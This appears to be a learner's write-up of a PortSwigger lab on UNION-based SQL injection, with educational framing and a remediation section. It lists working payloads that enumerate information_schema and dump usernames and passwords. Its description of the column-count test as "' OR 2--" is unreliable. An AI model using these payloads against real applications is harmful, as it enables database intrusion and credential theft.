# PortSwigger Lab: SQL Injection Attack - Listing Database Contents on Non-Oracle Databases

## Summary
This lab required discovering an unknown table and column names holding 
user credentials (rather than being given them upfront), then extracting 
all usernames and passwords to log in as the administrator.

## Vulnerability
The vulnerable injection point was the product category filter, which 
reflects query results in the response without sanitizing user input.

## Steps to Reproduce
1. Confirmed the column count using `' OR 2--` style testing, finding 
   that 2 columns worked but 3 caused an error, confirming the query 
   returns 2 columns
2. Verified string compatibility in both columns using:
   `' UNION SELECT 'a','a'--`
3. Queried the database version for reconnaissance:
   `' UNION SELECT version(), NULL--`
4. Listed all tables in the database using the built-in information 
   schema, since the credentials table name wasn't given:
   `' UNION SELECT table_name, NULL FROM information_schema.tables--`
   This revealed a table named `users_snczed` (randomized name)
5. Listed the columns within that specific table:
   `' UNION SELECT column_name, NULL FROM information_schema.columns 
   WHERE table_name='users_snczed'--`
   This revealed columns named `username_yqcbyn` and `password_tdcrdr` 
   (also randomized)
6. Extracted all usernames and passwords using the discovered table and 
   column names:
   `' UNION SELECT username_yqcbyn, password_tdcrdr FROM users_snczed--`
7. Found the `administrator` row in the results and used the 
   corresponding password to log in successfully

## Impact
This demonstrates that even when an application doesn't expose obvious 
table or column names, an attacker can still fully enumerate a 
database's structure using SQL's built-in metadata tables 
(`information_schema`), then extract all sensitive data — including 
admin credentials — without any prior knowledge of the schema.

## Fix
Use parameterized queries to prevent SQL injection at the source. 
Additionally, restrict database user permissions so the application's 
database account cannot query system metadata tables like 
`information_schema` if it doesn't need to, limiting what an attacker 
can enumerate even if injection occurs.

## What I Learned
This lab tied together every technique from previous labs into a full, 
realistic attack chain: determining column count and data type, then 
using `information_schema.tables` and `information_schema.columns` to 
discover a completely unknown table and column structure, and finally 
extracting the real data. I also learned firsthand that when tables and 
columns have randomized names (a common real-world defense pattern), 
the built-in schema tables completely bypass that obscurity — 
"security through obscurity" alone doesn't stop a determined SQL 
injection attack. Switching to Burp Suite's Repeater partway through 
this lab also taught me a practical lesson: testing injections directly 
in a browser address bar can introduce encoding issues (like special 
characters being stripped or misinterpreted) that don't occur when 
using a proper intercepting tool.
